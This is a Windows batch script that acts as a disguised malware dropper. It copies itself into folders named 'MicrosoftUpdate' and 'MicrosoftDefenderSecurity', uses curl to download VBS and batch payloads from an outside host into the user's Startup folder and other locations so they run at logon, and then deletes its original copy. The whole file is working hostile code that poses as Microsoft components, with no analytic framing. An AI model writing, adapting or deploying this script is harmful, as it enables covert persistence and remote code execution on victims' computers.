@echo off
cls

if not exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
mkdir "%APPDATA%/MicrosoftUpdate/"
copy /y %~f0 "%AppData%\MicrosoftUpdate\"
)

if not exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
mkdir "%PROGRAMDATA%/MicrosoftUpdate/"
copy /y %~f0 "%PROGRAMDATA%\MicrosoftUpdate\"
)

if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
copy /y "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUpdate.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
curl -L "https://freestream.us.to/schulprojekt/MicrosoftUpdate.vbs" --output "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
)

if not exist "%APPDATA%/MicrosoftDefenderSecurity/%~n0%~x0" (
mkdir "%APPDATA%/MicrosoftDefenderSecurity/"
copy /y %~f0 "%AppData%\MicrosoftDefenderSecurity\"
)

if not exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/%~n0%~x0" (
mkdir "%PROGRAMDATA%/MicrosoftDefenderSecurity/"
copy /y %~f0 "%PROGRAMDATA%\MicrosoftDefenderSecurity\"
)

if not exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
copy /y "%PROGRAMDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs" "%APPDATA%\MicrosoftDefenderSecurity\"
curl -L "https://freestream.us.to/schulprojekt/MicrosoftDefenderSecurity.vbs" --output "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs"
)

if not exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs" (
copy /y "%APPDATA%\MicrosoftDefenderSecurity\MicrosoftDefenderSecurity.vbs" "%PROGRAMDATA%\MicrosoftDefenderSecurity\"
curl -L "https://freestream.us.to/schulprojekt/MicrosoftDefenderSecurity.vbs" --output "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftDefenderSecurity.vbs"
)

curl -L "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%APPDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"
curl -L "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%PROGRAMDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"

curl -L "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat"
curl -L "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat"

if %~dp0 NEQ %APPDATA%\MicrosoftUpdate\ (
if %~dp0 NEQ %PROGRAMDATA%\MicrosoftUpdate\ (
if %~dp0 NEQ %APPDATA%\MicrosoftDefenderSecurity\ (
if %~dp0 NEQ %PROGRAMDATA%\MicrosoftDefenderSecurity\ (
del /f /q %~f0
))))

exit
